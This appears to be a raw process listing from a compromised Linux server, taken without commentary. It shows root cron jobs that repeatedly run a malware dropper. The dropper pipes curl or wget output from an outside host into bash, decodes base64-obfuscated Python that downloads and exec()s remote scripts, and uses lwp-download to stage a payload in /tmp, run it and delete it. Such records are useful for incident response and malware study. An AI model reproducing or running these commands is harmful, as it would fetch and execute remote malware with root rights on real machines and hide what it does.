+4 S root      659197  659195  0  80   0 -   600 -      04:46 ?        00:00:00 /bin/sh -c (curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms
+4 S root      659198  659196  0  80   0 -   600 -      04:46 ?        00:00:00 /bin/sh -c (curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms
+0 S root      659209  659197  0  80   0 -  1651 -      04:46 ?        00:00:00 bash -
+0 S root      659210  659209  0  80   0 -  5063 -      04:46 ?        00:00:00 python -c import urllib;exec(urllib.urlopen("http://bash.givemexyz.in/dd.py").read())
+0 S root      659213  659198  0  80   0 -  1651 -      04:46 ?        00:00:00 bash -
+0 S root      659214  659213  0  80   0 -  4730 -      04:46 ?        00:00:00 python -c import urllib;exec(urllib.urlopen("http://bash.givemexyz.in/dd.py").read())
+0 S root      660130  659210  0  80   0 -   600 -      04:48 ?        00:00:00 sh -c echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9iYi5weSIpLnJlYWQoKSkn | base64 -d | bash -
+0 S root      660133  660130  0  80   0 -  1651 -      04:48 ?        00:00:00 bash -
+0 S root      660134  660133  0  80   0 -  4730 -      04:48 ?        00:00:00 python -c import urllib;exec(urllib.urlopen("http://bash.givemexyz.in/bb.py").read())
+5 S root      666037     541  0  80   0 -  1934 -      05:11 ?        00:00:00 /usr/sbin/CRON -f
+4 S root      666041  666037  0  80   0 -   600 -      05:11 ?        00:00:00 /bin/sh -c (curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms
+0 S root      666205  666041  0  80   0 -  1651 -      05:11 ?        00:00:00 bash -
+0 S root      666209  666205  0  80   0 -  4731 -      05:11 ?        00:00:00 python -c import urllib;exec(urllib.urlopen("http://bash.givemexyz.in/dd.py").read())
+5 S root      667704     541  0  80   0 -  1934 -      05:17 ?        00:00:00 /usr/sbin/CRON -f
+4 S root      667707  667704  0  80   0 -   600 -      05:17 ?        00:00:00 /bin/sh -c (curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms
+0 S root      667717  667707  0  80   0 -  1651 -      05:17 ?        00:00:00 bash -
+0 S root      667718  667717  0  80   0 -  4695 -      05:17 ?        00:00:00 python -c import urllib;exec(urllib.urlopen("http://bash.givemexyz.in/dd.py").read())
+5 S root      667720     541  0  80   0 -  1934 -      05:18 ?        00:00:00 /usr/sbin/CRON -f
+4 S root      667721  667720  0  80   0 -   600 -      05:18 ?        00:00:00 /bin/sh -c (curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms
+0 S root      667733  667721  0  80   0 -  1651 -      05:18 ?        00:00:00 bash -
+0 S root      667734  667733  0  80   0 -  4695 -      05:18 ?        00:00:00 python -c import urllib;exec(urllib.urlopen("http://bash.givemexyz.in/dd.py").read())
+5 S root      668870     541  0  80   0 -  1934 -      05:22 ?        00:00:00 /usr/sbin/CRON -f
+4 S root      668873  668870  0  80   0 -   600 -      05:22 ?        00:00:00 /bin/sh -c (curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms
+0 S root      668884  668873  0  80   0 -  1651 -      05:22 ?        00:00:00 bash -
+0 S root      668885  668884  0  80   0 -  4695 -      05:22 ?        00:00:00 python -c import urllib;exec(urllib.urlopen("http://bash.givemexyz.in/dd.py").read())
+5 S root      671141     541  0  80   0 -  1934 -      05:27 ?        00:00:00 /usr/sbin/CRON -f
+4 S root      671142  671141  0  80   0 -   600 -      05:27 ?        00:00:00 /bin/sh -c (curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms
+0 S root      671293  671142  0  80   0 -  1651 -      05:27 ?        00:00:00 bash -
+0 S root      671294  671293  0  80   0 -  4695 -      05:27 ?        00:00:00 python -c import urllib;exec(urllib.urlopen("http://bash.givemexyz.in/dd.py").read())
+5 S root      672184     541  0  80   0 -  1934 -      05:31 ?        00:00:00 /usr/sbin/CRON -f
+4 S root      672185  672184  0  80   0 -   600 -      05:31 ?        00:00:00 /bin/sh -c (curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms
+0 S root      672334  672185  0  80   0 -  1651 -      05:31 ?        00:00:00 bash -
+0 S root      672335  672334  0  80   0 -  4695 -      05:31 ?        00:00:00 python -c import urllib;exec(urllib.urlopen("http://bash.givemexyz.in/dd.py").read())
+5 S root      675811     541  0  80   0 -  1934 -      05:44 ?        00:00:00 /usr/sbin/CRON -f
+4 S root      675815  675811  0  80   0 -   600 -      05:44 ?        00:00:00 /bin/sh -c (curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms
+0 S root      675832  675815  0  80   0 -  1651 -      05:44 ?        00:00:00 bash -
+0 S root      675833  675832  0  80   0 -  4695 -      05:44 ?        00:00:00 python -c import urllib;exec(urllib.urlopen("http://bash.givemexyz.in/dd.py").read())
+5 S root      675994     541  0  80   0 -  1934 -      05:46 ?        00:00:00 /usr/sbin/CRON -f
+4 S root      675995  675994  0  80   0 -   600 -      05:46 ?        00:00:00 /bin/sh -c (curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms
+0 S root      676007  675995  0  80   0 -  1651 -      05:46 ?        00:00:00 bash -
+0 S root      676008  676007  0  80   0 -  4695 -      05:46 ?        00:00:00 python -c import urllib;exec(urllib.urlopen("http://bash.givemexyz.in/dd.py").read())
+5 S root      676487     541  0  80   0 -  1934 -      05:49 ?        00:00:00 /usr/sbin/CRON -f
+4 S root      676488  676487  0  80   0 -   600 -      05:49 ?        00:00:00 /bin/sh -c (curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms
+0 S root      676495  676488  0  80   0 -  1651 -      05:49 ?        00:00:00 bash -
+0 S root      676496  676495  0  80   0 -  4833 -      05:49 ?        00:00:00 python -c import urllib;exec(urllib.urlopen("http://bash.givemexyz.in/dd.py").read())
+0 S root      676876  676496  0  80   0 -   600 -      05:49 ?        00:00:00 sh -c echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9iYi5weSIpLnJlYWQoKSkn | base64 -d | bash -
+0 S root      676879  676876  0  80   0 -  1651 -      05:49 ?        00:00:00 bash -
+0 S root      676880  676879  0  80   0 -  4695 -      05:49 ?        00:00:00 python -c import urllib;exec(urllib.urlopen("http://bash.givemexyz.in/bb.py").read())
+5 S root      677065     541  0  80   0 -  1934 -      05:51 ?        00:00:00 /usr/sbin/CRON -f
+4 S root      677066  677065  0  80   0 -   600 -      05:51 ?        00:00:00 /bin/sh -c (curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms
+0 S root      677073  677066  0  80   0 -  1651 -      05:51 ?        00:00:00 bash -
+0 S root      677074  677073  0  80   0 -  4695 -      05:51 ?        00:00:00 python -c import urllib;exec(urllib.urlopen("http://bash.givemexyz.in/dd.py").read())
+5 S root      677079     541  0  80   0 -  1934 -      05:52 ?        00:00:00 /usr/sbin/CRON -f
+4 S root      677081  677079  0  80   0 -   600 -      05:52 ?        00:00:00 /bin/sh -c (curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms
+0 S root      677093  677081  0  80   0 -  1651 -      05:52 ?        00:00:00 bash -
+0 S root      677094  677093  0  80   0 -  4695 -      05:52 ?        00:00:00 python -c import urllib;exec(urllib.urlopen("http://bash.givemexyz.in/dd.py").read())
+5 S root      677349     541  0  80   0 -  1934 -      05:58 ?        00:00:00 /usr/sbin/CRON -f
+5 S root      677350     541  0  80   0 -  1934 -      05:58 ?        00:00:00 /usr/sbin/CRON -f
+4 S root      677351  677350  0  80   0 -   600 -      05:58 ?        00:00:00 /bin/sh -c (curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms
+4 S root      677352  677349  0  80   0 -   600 -      05:58 ?        00:00:00 /bin/sh -c (curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms
+0 S root      677363  677352  0  80   0 -  1651 -      05:58 ?        00:00:00 bash -
+0 S root      677364  677363  0  80   0 -  4695 -      05:58 ?        00:00:00 python -c import urllib;exec(urllib.urlopen("http://bash.givemexyz.in/dd.py").read())
+0 S root      677367  677351  0  80   0 -  1651 -      05:58 ?        00:00:00 bash -
+0 S root      677368  677367  0  80   0 -  4695 -      05:58 ?        00:00:00 python -c import urllib;exec(urllib.urlopen("http://bash.givemexyz.in/dd.py").read())
+5 S root      679543     541  0  80   0 -  1934 -      06:08 ?        00:00:00 /usr/sbin/CRON -f
+4 S root      679545  679543  0  80   0 -   600 -      06:08 ?        00:00:00 /bin/sh -c (curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms
+0 S root      679566  679545  0  80   0 -  1651 -      06:08 ?        00:00:00 bash -
+0 S root      679567  679566  0  80   0 -  4833 -      06:08 ?        00:00:00 python -c import urllib;exec(urllib.urlopen("http://bash.givemexyz.in/dd.py").read())
+5 S root      682671     541  0  80   0 -  1934 -      06:15 ?        00:00:00 /usr/sbin/CRON -f
+4 S root      682672  682671  0  80   0 -   600 -      06:15 ?        00:00:00 /bin/sh -c (curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms
+0 S root      683264  682672  0  80   0 -  1651 -      06:16 ?        00:00:00 bash -
+0 S root      683265  683264  0  80   0 -  4730 -      06:16 ?        00:00:00 python -c import urllib;exec(urllib.urlopen("http://bash.givemexyz.in/dd.py").read())
+5 S root      685902     541  0  80   0 -  1934 -      06:24 ?        00:00:00 /usr/sbin/CRON -f
+4 S root      685903  685902  0  80   0 -   600 -      06:24 ?        00:00:00 /bin/sh -c (curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms
+0 S root      686062  685903  0  80   0 -  1651 -      06:24 ?        00:00:00 bash -
+0 S root      686063  686062  0  80   0 -  4695 -      06:24 ?        00:00:00 python -c import urllib;exec(urllib.urlopen("http://bash.givemexyz.in/dd.py").read())
+5 S root      687552     541  0  80   0 -  1934 -      06:31 ?        00:00:00 /usr/sbin/CRON -f
+4 S root      687554  687552  0  80   0 -   600 -      06:31 ?        00:00:00 /bin/sh -c (curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms
+0 S root      687683  687554  0  80   0 -  1651 -      06:31 ?        00:00:00 bash -
+0 S root      687685  687683  0  80   0 -  6183 -      06:31 ?        00:00:00 python -c import urllib;exec(urllib.urlopen("http://bash.givemexyz.in/dd.py").read())
+5 S root      688211     541  0  80   0 -  1934 -      06:34 ?        00:00:00 /usr/sbin/CRON -f
+4 S root      688213  688211  0  80   0 -   600 -      06:34 ?        00:00:00 /bin/sh -c (curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms
+0 S root      688234  688213  0  80   0 -  1651 -      06:34 ?        00:00:00 bash -
+0 S root      688235  688234  0  80   0 -  4695 -      06:34 ?        00:00:00 python -c import urllib;exec(urllib.urlopen("http://bash.givemexyz.in/dd.py").read())
+5 S root      688401     541  0  80   0 -  1934 -      06:36 ?        00:00:00 /usr/sbin/CRON -f
+4 S root      688404  688401  0  80   0 -   600 -      06:36 ?        00:00:00 /bin/sh -c (curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms
+0 S root      688562  688404  0  80   0 -  1651 -      06:36 ?        00:00:00 bash -
+0 S root      688563  688562  0  80   0 -  4834 -      06:36 ?        00:00:00 python -c import urllib;exec(urllib.urlopen("http://bash.givemexyz.in/dd.py").read())
+0 S root      689070  688563  0  80   0 -   600 -      06:37 ?        00:00:00 sh -c echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9iYi5weSIpLnJlYWQoKSkn | base64 -d | bash -
+0 S root      689073  689070  0  80   0 -  1651 -      06:37 ?        00:00:00 bash -
+0 S root      689074  689073  0  80   0 -  4695 -      06:37 ?        00:00:00 python -c import urllib;exec(urllib.urlopen("http://bash.givemexyz.in/bb.py").read())
+5 S root      689995     541  0  80   0 -  1934 -      06:41 ?        00:00:00 /usr/sbin/CRON -f
+4 S root      690000  689995  0  80   0 -   600 -      06:41 ?        00:00:00 /bin/sh -c (curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms
+0 S root      690009  690000  0  80   0 -  1651 -      06:41 ?        00:00:00 bash -
+0 S root      690010  690009  0  80   0 -  4695 -      06:41 ?        00:00:00 python -c import urllib;exec(urllib.urlopen("http://bash.givemexyz.in/dd.py").read())
+5 S root      690058     541  0  80   0 -  1934 -      06:42 ?        00:00:00 /usr/sbin/CRON -f
+4 S root      690061  690058  0  80   0 -   600 -      06:42 ?        00:00:00 /bin/sh -c (curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms
+0 S root      690076  690061  0  80   0 -  1651 -      06:42 ?        00:00:00 bash -
+0 S root      690077  690076  0  80   0 -  4695 -      06:42 ?        00:00:00 python -c import urllib;exec(urllib.urlopen("http://bash.givemexyz.in/dd.py").read())
+1 I root      690642       2  0  80   0 -     0 -      06:46 ?        00:00:00 [kworker/u64:2-ext4-rsv-conversion]
+5 S root      690715     541  0  80   0 -  1934 -      06:47 ?        00:00:00 /usr/sbin/CRON -f
+4 S root      690717  690715  0  80   0 -   600 -      06:47 ?        00:00:00 /bin/sh -c (curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms
+0 S root      690837  690717  0  80   0 -  1651 -      06:47 ?        00:00:00 bash -
+0 S root      690838  690837  0  80   0 -  4695 -      06:47 ?        00:00:00 python -c import urllib;exec(urllib.urlopen("http://bash.givemexyz.in/dd.py").read())
+5 S root      691061     541  0  80   0 -  1934 -      06:49 ?        00:00:00 /usr/sbin/CRON -f
+4 S root      691062  691061  0  80   0 -   600 -      06:49 ?        00:00:00 /bin/sh -c (curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms
+0 S root      691217  691062  0  80   0 -  1651 -      06:49 ?        00:00:00 bash -
+0 S root      691218  691217  0  80   0 -  4695 -      06:49 ?        00:00:00 python -c import urllib;exec(urllib.urlopen("http://bash.givemexyz.in/dd.py").read())
+5 S root      691654     541  0  80   0 -  1934 -      06:52 ?        00:00:00 /usr/sbin/CRON -f
+4 S root      691659  691654  0  80   0 -   600 -      06:52 ?        00:00:00 /bin/sh -c (curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms
+0 S root      691671  691659  0  80   0 -  1651 -      06:52 ?        00:00:00 bash -
+0 S root      691673  691671  0  80   0 -  4731 -      06:52 ?        00:00:00 python -c import urllib;exec(urllib.urlopen("http://bash.givemexyz.in/dd.py").read())
+5 S root      693832     541  0  80   0 -  1934 -      06:57 ?        00:00:00 /usr/sbin/CRON -f
+4 S root      693833  693832  0  80   0 -   600 -      06:57 ?        00:00:00 /bin/sh -c (curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms
+0 S root      693842  693833  0  80   0 -  1651 -      06:57 ?        00:00:00 bash -
+0 S root      693843  693842  0  80   0 -  4695 -      06:57 ?        00:00:00 python -c import urllib;exec(urllib.urlopen("http://bash.givemexyz.in/dd.py").read())
+5 S root      694769     541  0  80   0 -  1934 -      07:04 ?        00:00:00 /usr/sbin/CRON -f
+4 S root      694770  694769  0  80   0 -   600 -      07:04 ?        00:00:00 /bin/sh -c (curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms
+0 S root      694894  694770  0  80   0 -  1651 -      07:04 ?        00:00:00 bash -
+0 S root      694895  694894  0  80   0 -  4695 -      07:04 ?        00:00:00 python -c import urllib;exec(urllib.urlopen("http://bash.givemexyz.in/dd.py").read())
+5 S root      694975     541  0  80   0 -  1934 -      07:05 ?        00:00:00 /usr/sbin/CRON -f
+4 S root      694978  694975  0  80   0 -   600 -      07:05 ?        00:00:00 /bin/sh -c (curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms
+0 S root      694987  694978  0  80   0 -  1651 -      07:06 ?        00:00:00 bash -
+0 S root      694988  694987  0  80   0 -  4834 -      07:06 ?        00:00:00 python -c import urllib;exec(urllib.urlopen("http://bash.givemexyz.in/dd.py").read())
+0 S root      695360  694988  0  80   0 -   600 -      07:06 ?        00:00:00 sh -c echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9iYi5weSIpLnJlYWQoKSkn | base64 -d | bash -
+0 S root      695363  695360  0  80   0 -  1651 -      07:06 ?        00:00:00 bash -
+0 S root      695364  695363  0  80   0 -  4695 -      07:06 ?        00:00:00 python -c import urllib;exec(urllib.urlopen("http://bash.givemexyz.in/bb.py").read())
+1 I root      696983       2  0  80   0 -     0 -      07:11 ?        00:00:00 [kworker/0:0-events]
+5 S root      697389     541  0  80   0 -  1934 -      07:14 ?        00:00:00 /usr/sbin/CRON -f
+4 S root      697397  697389  0  80   0 -   600 -      07:14 ?        00:00:00 /bin/sh -c (curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms
+0 S root      697413  697397  0  80   0 -  1651 -      07:14 ?        00:00:00 bash -
+0 S root      697414  697413  0  80   0 -  4731 -      07:14 ?        00:00:00 python -c import urllib;exec(urllib.urlopen("http://bash.givemexyz.in/dd.py").read())
+5 S root      698783     541  0  80   0 -  1934 -      07:20 ?        00:00:00 /usr/sbin/CRON -f
+4 S root      698787  698783  0  80   0 -   600 -      07:20 ?        00:00:00 /bin/sh -c (curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms
+0 S root      698800  698787  0  80   0 -  1651 -      07:20 ?        00:00:00 bash -
+0 S root      698801  698800  0  80   0 -  5612 -      07:20 ?        00:00:00 python -c import urllib;exec(urllib.urlopen("http://bash.givemexyz.in/dd.py").read())
+1 I root      699323       2  0  80   0 -     0 -      07:22 ?        00:00:00 [kworker/u64:3-ext4-rsv-conversion]
+5 S root      699974     541  0  80   0 -  1934 -      07:24 ?        00:00:00 /usr/sbin/CRON -f
